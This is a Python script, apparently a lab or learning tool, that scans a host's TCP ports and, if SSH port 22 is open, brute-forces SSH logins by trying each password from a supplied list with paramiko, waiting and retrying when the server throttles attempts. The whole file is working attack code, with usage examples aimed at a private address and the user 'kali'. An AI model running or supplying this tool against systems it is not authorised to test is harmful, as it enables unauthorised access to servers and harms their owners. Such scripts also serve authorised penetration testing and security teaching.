import socket
import argparse
import textwrap
import paramiko
import time
from colorama import init, Fore

# Initialize colorama
init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

ssh_open = False


def create_range(start_port, end_port):
    """
    Create a range from the start port and the end port values passed as input
    :param start_port: (int) first or single port in the range
    :param end_port: (int) last port in the range
    :return: Range
    """
    try:
        if start_port <= end_port:
            return range(start_port, end_port + 1)
    except ValueError:
        pass
    raise argparse.ArgumentTypeError('Invalid port values format')


def scan_range(host, start_port, end_port):
    """
    Scan a range of ports
    :param start_port: (int) first or single port in the range
    :param end_port: (int) last port in the range
    :param host: (str) host to scan
    :return: None
    """
    ports = create_range(start_port, end_port)
    for port in ports:
        scan_port(host, port)


def scan_port(host, port):
    """
    Scan a single port
    :param port: (int) port to scan
    :param host: (str) host to scan
    :return: None
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # setting the timeout to 0.3 seconds
        sock.settimeout(0.3)
        result = sock.connect_ex((host, port))
        if result == 0:
            if port == 22:
                global ssh_open
                ssh_open = True
            print(f"The port {port} is open")
        else:
            pass
    except OSError as e:
        print(f"Connection Error: {e}")
    finally:
        # Closing the socket
        sock.close()


def brute_ssh(hostname, username, password):
    """
    :param hostname:(str) Hostname to connect to
    :param username: (str) username to use to connect
    :param password: (str) password to use to connect
    :return: None
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=1)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable. {RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid Credentials for{username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE} [*] Quota exceeded,retrying after 1 minute... {RESET}")
        time.sleep(60)
        return brute_ssh(hostname, username, password)
    else:
        print(f"{GREEN} [+] Found Combo:{username}:{password} {RESET}")
        return True


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='TCP portScanning tool',
                                     formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
            '''Example: python3 ssh_scanner_brute.py -H 192.168.250.12 -sp 20 -ep 90 -tp 22 -P passfile.txt -u kali
            python3 adv_port_scanner.py -H 192.168.250.12 -sp 80 -P passfile.txt -u kali
            '''))
    parser.add_argument('-sp', '--start_port', type=int, help="first or single port in the range")
    parser.add_argument('-ep', '--end_port', type=int, help="last port in the range")
    parser.add_argument('-tp', '--target_port', type=int, help="a port to target for the bruteforce - 22 by default")
    parser.add_argument('-H', '--host', help="specified host")
    parser.add_argument("-P", "--passfile", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")
    args = parser.parse_args()
    if args.end_port:
        scan_range(args.host, args.start_port, args.end_port)
    elif args.start_port:
        scan_port(args.host, args.start_port)

    target_port = 22 if not args.target_port else args.target_port

    if target_port == 22 and ssh_open:
        with open(args.passfile, "r") as p:
            for passwordAttempt in p:
                if brute_ssh(args.host, args.user, passwordAttempt):
                    break
    else:
        print(f"We are sorry, the port {target_port} is not yet available for the bruteforce.")
